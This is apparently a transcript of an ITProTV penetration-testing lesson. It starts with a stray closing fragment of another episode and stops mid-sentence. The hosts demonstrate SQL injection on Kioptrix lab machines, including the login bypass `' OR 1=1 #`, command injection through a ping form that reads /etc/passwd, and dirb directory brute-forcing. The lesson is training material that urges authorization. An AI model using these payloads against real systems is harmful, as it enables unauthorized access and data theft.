because\n\n443\n00:23:51.299 --> 00:23:55.447\na lot of the times the target they were\ntrying to is gonna be a Linux machine and\n\n444\n00:23:55.447 --> 00:23:57.492\nwe are not gonna have\nthat route access and\n\n445\n00:23:57.492 --> 00:23:59.438\nwe really want really indeed to get it.\n\n446\n00:23:59.438 --> 00:24:01.740\nSo we appreciate that,\nwe love the demonstrations,\n\n447\n00:24:01.740 --> 00:24:04.156\nwe hope everybody out there\nenjoyed watching this one.\n\n448\n00:24:04.156 --> 00:24:07.469\nSetting off for ItProTV,\nI've been your host Mike Rodrick.\n\n449\n00:24:07.469 -->

00:00:10.316\n&gt;&gt; You're watching ITPro.TV.\n\n4\n00:00:10.316 --> 00:00:15.230\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITPro.TV.\n\n5\n00:00:15.230 --> 00:00:18.950\nI'm your host Mike Roderick, and\ntoday we're doing penetration testing.\n\n6\n00:00:18.950 --> 00:00:23.560\nAnd in this episode, we're gonna be\ntaking a look at a very common attack\n\n7\n00:00:23.560 --> 00:00:25.920\nvector that we see out there in the wild.\n\n8\n00:00:25.920 --> 00:00:28.420\nAnd a really fun one to kinda work with.\n\n9\n00:00:28.420 --> 00:00:32.390\nBut a tricky one, is SQL Injection.\n\n10\n00:00:32.390 --> 00:00:37.610\nAnd here to make the mysterious\nless mysterious is Mr.\n\n11\n00:00:37.610 --> 00:00:39.020\nDaniel Lowry, welcome back Daniel.\n\n12\n00:00:39.020 --> 00:00:40.350\n&gt;&gt; Hey Mike, how's it going today?\n\n13\n00:00:40.350 --> 00:00:43.720\nYes, we are moving into the realm of\nSQL Injection ladies and gentlemen.\n\n14\n00:00:43.720 --> 00:00:46.560\nGlad to be back in the studio with you\nguys cuz we're continuing on with our\n\n15\n00:00:46.560 --> 00:00:48.470\npenetration testing series.\n\n16\n00:00:48.470 --> 00:00:52.130\nAnd if, I say this a lot,\nif you've ever set some security and\n\n17\n00:00:52.130 --> 00:00:54.520\nhopefully if you're here\nwatching this you probably have.\n\n18\n00:00:54.520 --> 00:00:59.510\nMight have done something security plushes\nor along those lines, learned about some\n\n19\n00:00:59.510 --> 00:01:03.430\nsecurity and that's what sparked you\ninto wanting to watch this series.\n\n20\n00:01:03.430 --> 00:01:06.250\nAnd if you've done that,\nif you've initiated a bit into security,\n\n21\n00:01:06.250 --> 00:01:07.480\nyou've heard about SQL Injection.\n\n22\n00:01:07.480 --> 00:01:12.000\nBecause, like Mike said,\nit's a very common attack factor.\n\n23\n00:01:12.000 --> 00:01:14.580\nBut it also is a little weird, okay?\n\n24\n00:01:14.580 --> 00:01:16.840\nAnd when I say weird what I mean is,\nbasically,\n\n25\n00:01:16.840 --> 00:01:19.952\nyou're taking the bowl of spaghetti and\nyou're throwing it against the wall.\n\n26\n00:01:19.952 --> 00:01:23.150\nAnd going, something stuck there,\nokay great,\n\n27\n00:01:23.150 --> 00:01:26.358\nlet's try that, let's continue\ndown that line of reasoning.\n\n28\n00:01:26.358 --> 00:01:31.850\nIt's an art more than a science really,\nat least initially.\n\n29\n00:01:31.850 --> 00:01:36.220\nAnd once you get past that,\nthe fact that a SQL\n\n30\n00:01:36.220 --> 00:01:39.530\ninjection is possible then it starts\nbecoming more of science than an art.\n\n31\n00:01:39.530 --> 00:01:45.420\nSo, initially trying to find\nsites that are SQL injectionable,\n\n32\n00:01:45.420 --> 00:01:48.220\nthat's a good way to say it.\n\n33\n00:01:48.220 --> 00:01:51.810\nVulnerable to sequel problems, then you\n\n34\n00:01:51.810 --> 00:01:56.510\ncan get in to using your knowledge\nto sequel to exploit the machine.\n\n35\n00:01:56.510 --> 00:01:57.190\nSo, let's start here.\n\n36\n00:01:57.190 --> 00:02:01.230\nLet's talk about what exactly is a sequel\ninjection, set the stage really quickly.\n\n37\n00:02:01.230 --> 00:02:04.680\nSequel injection is basically\ntrying to find a web app or\n\n38\n00:02:04.680 --> 00:02:09.060\na website that basically\nis running SQL queries.\n\n39\n00:02:09.060 --> 00:02:13.170\nIt allows you to input and\nthat input becomes part of the SQL query.\n\n40\n00:02:13.170 --> 00:02:15.880\nAnd then it queries the database,\nand the database returns results and\n\n41\n00:02:15.880 --> 00:02:20.560\nit gets formatted appropriately and\nbecomes the output to a website.\n\n42\n00:02:20.560 --> 00:02:22.480\nThat's it, soup to nuts, start to finish.\n\n43\n00:02:22.480 --> 00:02:28.180\nThe problem comes in when,\nas always, unsanitized input,\n\n44\n00:02:28.180 --> 00:02:33.230\nthey're not checking what\nkind of input is going in.\n\n45\n00:02:33.230 --> 00:02:37.952\nIf you don't do that, well then I can\nsay well don't put that in there,\n\n46\n00:02:37.952 --> 00:02:42.910\nput this in there and it okay,\nthis isn't proper area for me to look for\n\n47\n00:02:42.910 --> 00:02:47.590\nsomething that I'm going to add\nto a SQL query, so I'll take it.\n\n48\n00:02:47.590 --> 00:02:52.100\nSo if you're not checking there,\nthat can definitely cause you problems.\n\n49\n00:02:52.100 --> 00:02:52.920\nOf course what does that do?\n\n50\n00:02:52.920 --> 00:02:58.360\nIt allows us to issue arbitrary\nSQL commands to our website there.\n\n51\n00:02:58.360 --> 00:03:03.010\n&gt;&gt; So really it's not a problem\nwith the SQL server in this case.\n\n52\n00:03:03.010 --> 00:03:05.850\nI mean the SQL server's doing what it's\nsupposed to do, processing commands,\n\n53\n00:03:05.850 --> 00:03:08.590\nthe problem is why did\nthat website let me,\n\n54\n00:03:08.590 --> 00:03:11.230\na visitor,\nissue a command in the first place.\n\n55\n00:03:11.230 --> 00:03:12.360\n&gt;&gt; Right, nail in the head.\n\n56\n00:03:12.360 --> 00:03:13.560\nMike's exactly right.\n\n57\n00:03:13.560 --> 00:03:15.380\nThe SQL server has no issue,\n\n58\n00:03:15.380 --> 00:03:19.740\nit's the front end to that server\nthat is causing the problem.\n\n59\n00:03:19.740 --> 00:03:26.860\nIt's allowing you, as a non-admin,\nto input SQL data or commands.\n\n60\n00:03:26.860 --> 00:03:30.410\nAll right, so\nthat was what the problem was.\n\n61\n00:03:30.410 --> 00:03:31.760\nWhere can you do this?\n\n62\n00:03:31.760 --> 00:03:33.370\nYou can do this in\na couple of ways any time,\n\n63\n00:03:33.370 --> 00:03:35.540\nif you have may be like an input box.\n\n64\n00:03:35.540 --> 00:03:37.580\nUsually we see this in form of a user and\n\n65\n00:03:37.580 --> 00:03:40.795\na password fields,\nsomething of that nature.\n\n66\n00:03:40.795 --> 00:03:44.450\nMaybe if you're asked,\nit has like a drop down menu and\n\n67\n00:03:44.450 --> 00:03:48.590\nhas a few different options available for\nyou.\n\n68\n00:03:48.590 --> 00:03:52.820\nThose could be part of a SQL statement,\nso when you choose your language or\n\n69\n00:03:52.820 --> 00:03:56.550\nsomething of that effect, it actually\nputs language equals da da da da\n\n70\n00:03:56.550 --> 00:04:00.620\ninside of that SQL statement and\nqueries accordingly, okay.\n\n71\n00:04:00.620 --> 00:04:01.840\nSo you can see it there.\n\n72\n00:04:01.840 --> 00:04:08.010\nYou can see it in just anywhere there's an\ninput field or input to the site itself.\n\n73\n00:04:08.010 --> 00:04:12.086\nOr it's just straight in to the URL,\nwhich we will actually use quite a bit.\n\n74\n00:04:12.086 --> 00:04:17.129\nWe're gonna start with very simplistic\nSQL injection so that we can get and\n\n75\n00:04:17.129 --> 00:04:22.348\nidea what its look like, how it reacts,\nwhat happens and move on from there.\n\n76\n00:04:22.348 --> 00:04:26.716\nActually, I have three SQL\nservers running right now and\n\n77\n00:04:26.716 --> 00:04:29.997\nthey all three have\ntheir own web front in.\n\n78\n00:04:29.997 --> 00:04:32.285\nI grab these guys from vonehub.com.\n\n79\n00:04:32.285 --> 00:04:36.075\nDon't forget to go on there and grab\nthese so that you can follow along and\n\n80\n00:04:36.075 --> 00:04:37.420\nplay with us.\n\n81\n00:04:37.420 --> 00:04:41.771\nThey will be the kioptrix,\nit's a weird one,\n\n82\n00:04:41.771 --> 00:04:48.357\nthe K-I-O-P-T-R-I-X machines and\nI got, 1.1, 1.2 and\n\n83\n00:04:48.357 --> 00:04:53.394\n1.3, which are oddly named\nwhen you fire them up.\n\n84\n00:04:53.394 --> 00:04:55.991\nKioptrix two, three and four.\n\n85\n00:04:55.991 --> 00:04:57.560\n&gt;&gt; [LAUGH]\n&gt;&gt; So yeah.\n\n86\n00:04:57.560 --> 00:05:00.440\nIt can definitely twirl your\nhead around a little bit,\n\n87\n00:05:00.440 --> 00:05:05.430\nit was fun going, hold on what's going\non again, keeping things straight.\n\n88\n00:05:05.430 --> 00:05:11.430\nI also made in my Linux machine,\nI went into the Etsy host file.\n\n89\n00:05:11.430 --> 00:05:13.540\nAnd I'm gonna show you that really\nquickly cuz it's a good thing to do.\n\n90\n00:05:13.540 --> 00:05:15.920\nIt helps so\nyou don't have to work with ip addresses.\n\n91\n00:05:15.920 --> 00:05:19.380\nIf you go up in,\nyou should do something like cat or\n\n92\n00:05:19.380 --> 00:05:25.044\nif you wanna open it nano/etsy/hosts.\n\n93\n00:05:25.044 --> 00:05:30.610\nJust made some entries there just\nlike that you put the ip address.\n\n94\n00:05:30.610 --> 00:05:33.060\nAnd then a space and\nwhatever you wanna call it.\n\n95\n00:05:33.060 --> 00:05:37.380\nI just call it a kioptrix-3,\nkey kioptirx-1, and kioptrix-4, so\n\n96\n00:05:37.380 --> 00:05:43.310\nI can easily just use those names\ninstead typing on an IP address.\n\n97\n00:05:43.310 --> 00:05:43.980\n&gt;&gt; Very smart.\n\n98\n00:05:43.980 --> 00:05:48.150\n&gt;&gt; Yeah, so do that, it'll help you out,\nAlt Ctrl x over there.\n\n99\n00:05:48.150 --> 00:05:51.990\nWhat else do I want you guys to know about\nthese boxes, I think that's about it.\n\n100\n00:05:51.990 --> 00:05:55.280\nJust get them in your environment, fire\nthem up, download them from vulnhub, and\n\n101\n00:05:55.280 --> 00:05:58.530\nthey will help us with this you can\nfollow along and do what we're gonna do.\n\n102\n00:05:58.530 --> 00:06:02.410\nSo let's start with kioptrix,\nlooks like number one here.\n\n103\n00:06:02.410 --> 00:06:04.700\nSo what we're gonna do is I'm\ngonna open up my browser.\n\n104\n00:06:04.700 --> 00:06:10.140\nAnd of course we've done all our\ntypical scanning and enumeration right.\n\n105\n00:06:10.140 --> 00:06:12.530\nWe've run nmap -a -t4.\n\n106\n00:06:12.530 --> 00:06:18.190\nAll ports we found that is running a web\nsite and also maybe that they're SQL.\n\n107\n00:06:18.190 --> 00:06:20.600\nMaybe we've run nitko against it.\n\n108\n00:06:20.600 --> 00:06:23.930\nNikto, I always say it nitko, it's nikto.\n\n109\n00:06:23.930 --> 00:06:26.312\nI'm dyslexic so help me out here.\n\n110\n00:06:26.312 --> 00:06:28.910\n[LAUGH] Run that scan,\nlook for vulnerabilities.\n\n111\n00:06:28.910 --> 00:06:33.560\nWell I saw some SQL entries on that, so\nthere we go, I know sequel is running.\n\n112\n00:06:33.560 --> 00:06:36.110\nSo let me fire that guy up here.\n\n113\n00:06:36.110 --> 00:06:42.625\nJust to browse the http:// and\nthen it was, h, yeah.\n\n114\n00:06:42.625 --> 00:06:47.410\nKioptrix-.com, like that.\n\n115\n00:06:47.410 --> 00:06:51.762\nAnd there you go, it's a simple page, cuz\nwe're gonna do something very simple and\n\n116\n00:06:51.762 --> 00:06:53.630\nwe have to input fields.\n\n117\n00:06:53.630 --> 00:06:55.530\nOne's a username, one's a password.\n\n118\n00:06:55.530 --> 00:06:58.040\nAnd this is where I talk about\nthat whole scatter gun approach,\n\n119\n00:06:58.040 --> 00:06:59.780\nthe throwing the spaghetti on the wall.\n\n120\n00:06:59.780 --> 00:07:04.260\nIs I'm just gonna try some SQL and\nsee what happens, all right,\n\n121\n00:07:04.260 --> 00:07:06.880\ncuz that's a lot what we do, right.\n\n122\n00:07:06.880 --> 00:07:08.640\nJust to see if it works.\n\n123\n00:07:08.640 --> 00:07:13.050\nYou can check out, look for\nSQL injection cheat sheets.\n\n124\n00:07:13.050 --> 00:07:14.610\nJust do a Google search for that.\n\n125\n00:07:14.610 --> 00:07:16.760\nI think pentestmonkey has some on there.\n\n126\n00:07:16.760 --> 00:07:18.140\nHe's got a good list of that.\n\n127\n00:07:18.140 --> 00:07:20.740\nExploit DB also has a good one.\n\n128\n00:07:20.740 --> 00:07:23.020\nI'll put the links to\nthat in the show notes so\n\n129\n00:07:23.020 --> 00:07:24.670\nyou can peruse those cheat sheets.\n\n130\n00:07:24.670 --> 00:07:26.480\nI'm sure they're not\nthe only game in town.\n\n131\n00:07:26.480 --> 00:07:27.600\nFind ones that you like.\n\n132\n00:07:27.600 --> 00:07:30.170\nMaybe there's some that are more thorough,\nsome that are less thorough.\n\n133\n00:07:30.170 --> 00:07:35.440\nMaybe there are, you find a site that has\nthem and they make more sense to you.\n\n134\n00:07:35.440 --> 00:07:38.260\nIt just depends on teaching methods and\nstyles.\n\n135\n00:07:38.260 --> 00:07:40.180\nSo I'll find you a cheat\nsheet that can very helpful.\n\n136\n00:07:40.180 --> 00:07:45.050\nAnd you can just start throwing these\nthings at your input and see if they work.\n\n137\n00:07:45.050 --> 00:07:47.140\nAnd that's it,\nthat whole scattergun approach.\n\n138\n00:07:47.140 --> 00:07:51.109\nIf I go to the username portion here and\n\n139\n00:07:51.109 --> 00:07:54.836\nI just say, blah user, like that.\n\n140\n00:07:54.836 --> 00:07:56.379\nActually, I don't even need\nthat to be honest with you.\n\n141\n00:07:56.379 --> 00:08:01.107\nI'm just gonna add the single quote,\nSpace.\n\n142\n00:08:01.107 --> 00:08:07.080\nOr, 1 = 1, and then a hash, like that.\n\n143\n00:08:07.080 --> 00:08:10.650\nI hit Return, and look what it does.\n\n144\n00:08:10.650 --> 00:08:14.880\nIt allows me access into this\nbasic administrative console.\n\n145\n00:08:14.880 --> 00:08:15.520\n&gt;&gt; Wow.\n&gt;&gt; Right?\n\n146\n00:08:15.520 --> 00:08:19.420\nSo, Mike you know a bit about SQL here.\n\n147\n00:08:21.460 --> 00:08:24.190\nIt's interesting to know what's\ngoing on in the background.\n\n148\n00:08:24.190 --> 00:08:27.656\n&gt;&gt; It really is cuz I'm sure you're\ngonna show how we work through this,\n\n149\n00:08:27.656 --> 00:08:31.593\nwe're really trying to figure out what\nSQL statement they're using in the back\n\n150\n00:08:31.593 --> 00:08:34.470\nof this code as we're putting that,\nI think in this case,\n\n151\n00:08:34.470 --> 00:08:37.500\na little single apostrophe or\none equals one.\n\n152\n00:08:37.500 --> 00:08:41.040\nAnd we know with an or statement,\neither side has to ring true, right?\n\n153\n00:08:41.040 --> 00:08:45.630\nWe don't know username, or we might or\nmight not, or one equals one.\n\n154\n00:08:45.630 --> 00:08:47.420\nWell does one equal one?\n\n155\n00:08:47.420 --> 00:08:48.010\n&gt;&gt; Usually.\n\n156\n00:08:48.010 --> 00:08:50.470\n&gt;&gt; Usually in most math systems right?\n\n157\n00:08:50.470 --> 00:08:55.590\nSo even thought the username part didn't\nring true, the second part did and\n\n158\n00:08:55.590 --> 00:08:59.980\ntherefore it allowed me to continue on or\nif we could start to evaluate that SQL\n\n159\n00:08:59.980 --> 00:09:02.310\nstatement behind there and\nsee what we can do.\n\n160\n00:09:02.310 --> 00:09:05.980\n&gt;&gt; Yeah what's interesting about\nthis as well is you get this cool\n\n161\n00:09:05.980 --> 00:09:09.380\nwelcome to the basic administrative web\nconsole ping machine on the network.\n\n162\n00:09:11.070 --> 00:09:11.890\nSo it's running ping.\n\n163\n00:09:11.890 --> 00:09:16.282\nSo if I say, you know,\ngive it it's own loop back address\n\n164\n00:09:16.282 --> 00:09:22.020\n127.0.0.1, like that, hit enter,\nit's trying to connect.\n\n165\n00:09:22.020 --> 00:09:23.540\nAnd cool, I get ping output.\n\n166\n00:09:23.540 --> 00:09:25.190\nSo what is it doing?\n\n167\n00:09:25.190 --> 00:09:26.410\nIt's running ping.\n\n168\n00:09:26.410 --> 00:09:30.910\nRemember we did a show and\nwe talked about command injection, right?\n\n169\n00:09:30.910 --> 00:09:33.610\nWell, if it's just doing ping in Linux,\n\n170\n00:09:33.610 --> 00:09:36.730\nI can use a semicolon and\nadd commands to it.\n\n171\n00:09:36.730 --> 00:09:43.870\nSo if I come back and I just do semicolon,\ncaps, FC slash password.\n\n172\n00:09:43.870 --> 00:09:47.030\nLet's see what happens.\n\n173\n00:09:47.030 --> 00:09:50.070\nHey look, there's the FC password file.\n\n174\n00:09:50.070 --> 00:09:50.775\n&gt;&gt; That was too darn easy.\n\n175\n00:09:50.775 --> 00:09:51.933\n&gt;&gt; That's a little too easy for us, right?\n\n176\n00:09:51.933 --> 00:09:54.160\nThat's fun stuff.\n\n177\n00:09:54.160 --> 00:09:57.050\nAnd there's some users,\nwe've got Harold, we've got John.\n\n178\n00:09:57.050 --> 00:09:58.820\nLot of cool stuff going on there.\n\n179\n00:09:58.820 --> 00:10:04.220\nInteresting things, there was great\ninroad into exploiting this machine.\n\n180\n00:10:04.220 --> 00:10:05.420\nVery cool stuff.\n\n181\n00:10:05.420 --> 00:10:07.140\nBut that was pretty simple.\n\n182\n00:10:07.140 --> 00:10:08.260\nLet's take a look at another one here.\n\n183\n00:10:08.260 --> 00:10:09.270\nLet me close these down.\n\n184\n00:10:09.270 --> 00:10:12.030\nIt's a very similar attack.\n\n185\n00:10:12.030 --> 00:10:19.900\nI'm gonna go to keoptricks4.com.\n\n186\n00:10:19.900 --> 00:10:21.460\nAnd again, very similar.\n\n187\n00:10:21.460 --> 00:10:23.760\nWe have a log in screen.\n\n188\n00:10:23.760 --> 00:10:25.720\nUsername and password.\n\n189\n00:10:25.720 --> 00:10:27.991\nI wonder if our little\nattack will work here?\n\n190\n00:10:27.991 --> 00:10:29.512\nWell we'll try it again, same kinda thing.\n\n191\n00:10:29.512 --> 00:10:34.029\nSingle quote, OR 1=1 # and\n\n192\n00:10:34.029 --> 00:10:41.420\njust put whatever in the password and\nhit login.\n\n193\n00:10:41.420 --> 00:10:43.940\nWrong username or password, okay.\n\n194\n00:10:43.940 --> 00:10:46.320\nWell maybe if I leave\nthe password part out.\n\n195\n00:10:46.320 --> 00:10:53.130\nIf I say single quote or one equals\none hash just leave the password out.\n\n196\n00:10:54.750 --> 00:10:59.410\nNow, so obviously the user\nname portion is looking for\n\n197\n00:10:59.410 --> 00:11:01.500\na certain string of data, right.\n\n198\n00:11:01.500 --> 00:11:04.850\nSo that's why that's not working,\nbecause I'm not able to or it's.\n\n199\n00:11:04.850 --> 00:11:06.020\nI'm not able to say this, or\n\n200\n00:11:06.020 --> 00:11:09.270\nthis, it's just saying,\nthis is what it should look like.\n\n201\n00:11:09.270 --> 00:11:10.800\nThis does not look like that.\n\n202\n00:11:10.800 --> 00:11:12.270\nSo that's bad, that's wrong.\n\n203\n00:11:12.270 --> 00:11:15.840\nAnd of course the password field\nwas either blank or wrong so\n\n204\n00:11:15.840 --> 00:11:16.450\nI'm getting that wrong.\n\n205\n00:11:16.450 --> 00:11:20.610\nBut what if I reverse the process, right?\n\n206\n00:11:20.610 --> 00:11:21.440\nWhat if I do that?\n\n207\n00:11:21.440 --> 00:11:23.170\n&gt;&gt; I really like it.\n\n208\n00:11:23.170 --> 00:11:23.950\n&gt;&gt; I do too.\n\n209\n00:11:23.950 --> 00:11:28.620\nNow with this obviously that\npassword area is looking for\n\n210\n00:11:28.620 --> 00:11:31.020\na specific, like an actual user again.\n\n211\n00:11:31.020 --> 00:11:33.840\nSo I would need to enumerate\nsome user accounts.\n\n212\n00:11:33.840 --> 00:11:38.391\nLet's give that a shot actually,\nI think that this would be\n\n213\n00:11:38.391 --> 00:11:43.035\na cool place to use DIR,\nDirBuster or GoBuster, whatever,\n\n214\n00:11:43.035 --> 00:11:48.880\nany one of those cool busters that\nbasically brute forces web directories.\n\n215\n00:11:48.880 --> 00:11:54.836\nRight, so let's do that because I found\nsome interesting stuff when I did that,\n\n216\n00:11:54.836 --> 00:11:56.610\nenumerating this box.\n\n217\n00:11:56.610 --> 00:12:02.669\nSo if I did did derb and\nI say http:// and I say kiorptix-4.com,\n\n218\n00:12:02.669 --> 00:12:09.564\nand then I say, I'm gonna use the big\nword file that they have, it basically,\n\n219\n00:12:09.564 --> 00:12:16.910\nit has a dictionary of words that it tries\nto use as common directory names, right?\n\n220\n00:12:16.910 --> 00:12:21.495\nSo I'm gonna use the big\nword file which is\n\n221\n00:12:21.495 --> 00:12:25.951\nlocated in user/share/wordlists and\n\n222\n00:12:25.951 --> 00:12:29.881\nI think it's big.tx big .txt,\n\n223\n00:12:29.881 --> 00:12:34.346\nno it's dirb/big.txt, there we go.\n\n224\n00:12:34.346 --> 00:12:38.987\nIt's generating the world list,\nit's gonna run through this thing,\n\n225\n00:12:38.987 --> 00:12:42.200\nI can't remember how long this takes.\n\n226\n00:12:42.200 --> 00:12:45.590\nCouldn't resolve host, what did I do?\n\n227\n00:12:45.590 --> 00:12:47.560\nI spelled keyoptics wrong,\nthat would be a problem.\n\n228\n00:12:48.950 --> 00:12:51.050\nIt is a twisty little,\nI don't know how to name this thing.\n\n229\n00:12:51.050 --> 00:12:54.372\nLet's keep up, tricks, let's try that.\n\n230\n00:12:54.372 --> 00:12:57.170\n&gt;&gt; [LAUGH]\n&gt;&gt; Generating the word list.\n\n231\n00:12:57.170 --> 00:12:59.570\nAnd, hopefully it doesn't\ntake too very long.\n\n232\n00:12:59.570 --> 00:13:01.270\nThere we go.\nYou can see it kind of cranking through\n\n233\n00:13:01.270 --> 00:13:02.500\nall the words.\n\n234\n00:13:02.500 --> 00:13:06.510\nTrying to find, it found CGI Bin.\n\n235\n00:13:06.510 --> 00:13:09.700\nIt's found, here is a directory log out.\n\n236\n00:13:09.700 --> 00:13:11.430\nHere is another one, member.\n\n237\n00:13:11.430 --> 00:13:15.540\nOkay, that was pretty quick and\nit found five different directories.\n\n238\n00:13:17.130 --> 00:13:22.620\nAnd if I look through them I found one\ncalled John and one called Robert.\n\n239\n00:13:22.620 --> 00:13:25.610\nThose seem more like actual people,\n\n240\n00:13:25.610 --> 00:13:27.965\nlike I don't know why someone\nwould just name a directory John.\n\n241\n00:13:27.965 --> 00:13:30.090\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know why someone would name\n\n242\n00:13:30.090 --> 00:13:34.260\na directory Robert other than they\nare users and they are their folders.\n\n243\n00:13:34.260 --> 00:13:35.390\n&gt;&gt; Definitely a good chance right?\n\n244\n00:13:35.390 --> 00:13:39.300\n&gt;&gt; Right, so definitely a good chance\nthat this might be two good users.\n\n245\n00:13:39.300 --> 00:13:40.100\nSo we'll try them.\n\n246\n00:13:40.100 --> 00:13:40.600\nLet's do that.\n\n247\n00:13:41.890 --> 00:13:44.330\nWe'll go here, we'll go back to try again.\n\n248\n00:13:45.420 --> 00:13:50.870\nAnd this time we will say John and then\nwhen we come down to the password area,\n\n249\n00:13:50.870 --> 00:13:56.230\nwe'll do our single quotation space or\n\n250\n00:13:56.230 --> 00:14:00.280\nspace one equals one space.\n\n251\n00:14:00.280 --> 00:14:06.140\nAnd your hash, hit return and\nnow I get my numbers\n\n252\n00:14:06.140 --> 00:14:10.350\ncontrol panel and it shows me the username\nand what his password actually is.\n\n253\n00:14:10.350 --> 00:14:13.010\nSo I have bypassed the law again.\n\n254\n00:14:13.010 --> 00:14:17.140\nSo my password field was not\nbeing sanitized very well even\n\n255\n00:14:17.140 --> 00:14:18.370\nthough they did with the username.\n\n256\n00:14:18.370 --> 00:14:20.350\nGod knows why they didn't\ndo it with the passwords.\n\n257\n00:14:20.350 --> 00:14:22.980\nBut they didn't and\nnow you can see how this works.\n\n258\n00:14:22.980 --> 00:14:27.550\nSo, giving you a good idea of getting\ninitiated into signal injection.\n\n259\n00:14:27.550 --> 00:14:31.320\n&gt;&gt; It might sound silly but you will\nfind that kind of thing out in the wild\n\n260\n00:14:31.320 --> 00:14:35.030\nwhere for some reason they just didn't\nget around to doing the other field or\n\n261\n00:14:35.030 --> 00:14:37.710\nthey mistakenly thought they were and\n\n262\n00:14:37.710 --> 00:14:42.740\nthey were not doing checks on\nthose inputs and it slips through.\n\n263\n00:14:42.740 --> 00:14:43.800\n&gt;&gt; Yeah, it happens.\n\n264\n00:14:43.800 --> 00:14:45.390\nGuys are out there coding\ntrying to bang away.\n\n265\n00:14:45.390 --> 00:14:48.530\nHe's got somebody over their shoulder\ngoing, when's that gonna get done?\n\n266\n00:14:48.530 --> 00:14:49.790\nWe need that by tonight.\n\n267\n00:14:49.790 --> 00:14:51.410\nIs that gonna be done,\nis that gonna be done?\n\n268\n00:14:51.410 --> 00:14:52.780\nSo they're hurrying, they're rushing.\n\n269\n00:14:52.780 --> 00:14:54.310\nYou gotta remember we're all humans.\n\n270\n00:14:54.310 --> 00:14:59.750\nWe make mistakes and these things\nhappen but as the penetration tester,\n\n271\n00:14:59.750 --> 00:15:04.370\nwhereas the bad actor that's out there in\nthe wild, are looking for those mistakes.\n\n272\n00:15:04.370 --> 00:15:07.140\nOne's looking for those mistakes to\nrectify them, the other one's looking for\n\n273\n00:15:07.140 --> 00:15:08.860\nthem to exploit them.\n\n274\n00:15:08.860 --> 00:15:10.420\nSo there it is.\n\n275\n00:15:10.420 --> 00:15:16.210\nAnd again our caveat for the day is\ndon't perform these attacks on machines\n\n276\n00:15:16.210 --> 00:15:21.480\nthat you do not have authorization for\nor that you own explicitly.\n\n277\n00:15:21.480 --> 00:15:24.250\nSo there we go,\ndon't do bad things to people.\n\n278\n00:15:24.250 --> 00:15:27.920\nIt's not nice, you don't wanna end up in\na hotel with a guy with a stick going,\n\n279\n00:15:27.920 --> 00:15:31.015\nI'm gonna hit you in the head with this\nif you don't lay down to your sleep.\n\n280\n00:15:31.015 --> 00:15:33.010\n[LAUGH] If you don't go to\nsleep I will put you to sleep.\n\n281\n00:15:34.150 --> 00:15:37.300\nSo there we go, that was pretty\nstraightforward, pretty simple.\n\n282\n00:15:37.300 --> 00:15:43.240\nAnd usually when you see a SQL\ninjection type of talk or\n\n283\n00:15:43.240 --> 00:15:45.760\nteaching, that's about as\nfar as you usually get.\n\n284\n00:15:45.760 --> 00:15:47.500\nBut that's not the end of the game.\n\n285\n00:15:47.500 --> 00:15:49.200\nWe went down a little bit deeper.\n\n286\n00:15:49.200 --> 00:15:52.050\nLet's talk error based enumeration.\n\n287\n00:15:52.050 --> 00:15:54.470\nWhat is error based enumeration?\n\n288\n00:15:54.470 --> 00:15:57.672\nIt doesn't happen often, but\nsometimes you do something,\n\n289\n00:15:57.672 --> 00:16:01.186\nyou type something into input, or\nyou do something and it's not,\n\n290\n00:16:01.186 --> 00:16:04.671\nOr doesn't work correctly, and\nthe SQL Server throws an error.\n\n291\n00:16:04.671 --> 00:16:08.430\nAnd that error comes out on the website,\nright?\n\n292\n00:16:08.430 --> 00:16:13.150\nSo, you tried to type something in,\nit says, error, your syntax is wrong.\n\n293\n00:16:13.150 --> 00:16:15.130\nThis happens sometimes, not a lot,\n\n294\n00:16:15.130 --> 00:16:17.890\nbecause it's a bad idea to\nallows those things to happen.\n\n295\n00:16:17.890 --> 00:16:20.930\n&gt;&gt; But again, it's another one of\nthose things where it's another step.\n\n296\n00:16:20.930 --> 00:16:24.430\nAnd when you're in a rush, when you're\nin a hurry, you might not think about,\n\n297\n00:16:24.430 --> 00:16:27.240\nhey, do I need to capture these errors?\n\n298\n00:16:27.240 --> 00:16:29.979\nCuz most sites nowadays have\ngotten better about it, right?\n\n299\n00:16:29.979 --> 00:16:32.178\nAnd you get that little\nfriendly splash screen,\n\n300\n00:16:32.178 --> 00:16:35.630\noops sorry couldn't find\nthe page you were looking for.\n\n301\n00:16:35.630 --> 00:16:39.200\nBut now and again,\nyou still see the actual error come up.\n\n302\n00:16:39.200 --> 00:16:42.430\nAnd, as Daniel said,\nthere can be a lot of good information.\n\n303\n00:16:42.430 --> 00:16:44.710\nOr if we're the company\n&gt;&gt; [LAUGH]\n\n304\n00:16:44.710 --> 00:16:46.560\n&gt;&gt; Really sensitive information that is\n\n305\n00:16:46.560 --> 00:16:49.070\ngetting exposed to unauthorized viewers.\n\n306\n00:16:49.070 --> 00:16:50.110\n&gt;&gt; Yeah, that's exactly right.\n\n307\n00:16:50.110 --> 00:16:52.575\nSo, if you do run across,\n\n308\n00:16:52.575 --> 00:16:56.190\nif you're ping testing,\nyou wanna try error based enumeration.\n\n309\n00:16:56.190 --> 00:17:00.630\nLook for\nerrors occurring from the website.\n\n310\n00:17:00.630 --> 00:17:04.920\nAnd if there's SQL, you see SQL,\nwell, now you know, well, I'm,\n\n311\n00:17:04.920 --> 00:17:09.990\nmaybe I can use that information to\nsuccessfully craft a SQL injection attack.\n\n312\n00:17:09.990 --> 00:17:14.330\nCuz it's giving you outputs that can\nlend you to realize these things.\n\n313\n00:17:14.330 --> 00:17:18.150\n&gt;&gt; Sometimes it'll even show you\nthe query that's being executed,\n\n314\n00:17:18.150 --> 00:17:21.430\nwhich is exactly what I need to\ncomplete a command or SQL injection.\n\n315\n00:17:21.430 --> 00:17:25.920\n&gt;&gt; Right, so let's take a look at what\na vulnerable server might look like.\n\n316\n00:17:25.920 --> 00:17:28.260\nI'm going to go to key objects three.\n\n317\n00:17:28.260 --> 00:17:30.080\nI know we're bouncing all over the place.\n\n318\n00:17:30.080 --> 00:17:35.690\nDaniel, one, three, or\nfour and what's going on here.\n\n319\n00:17:35.690 --> 00:17:38.800\nI know, it's a little twisty,\nbut you guys will get it.\n\n320\n00:17:38.800 --> 00:17:41.070\nAll right, so here's key objects three.\n\n321\n00:17:41.070 --> 00:17:44.510\nAnd we've got a blog,\nwe've got a login area.\n\n322\n00:17:44.510 --> 00:17:46.320\nDoing our enumeration, perusing.\n\n323\n00:17:46.320 --> 00:17:50.260\nRemember, when you're pen testing,\nthere is no link you don't follow, right?\n\n324\n00:17:50.260 --> 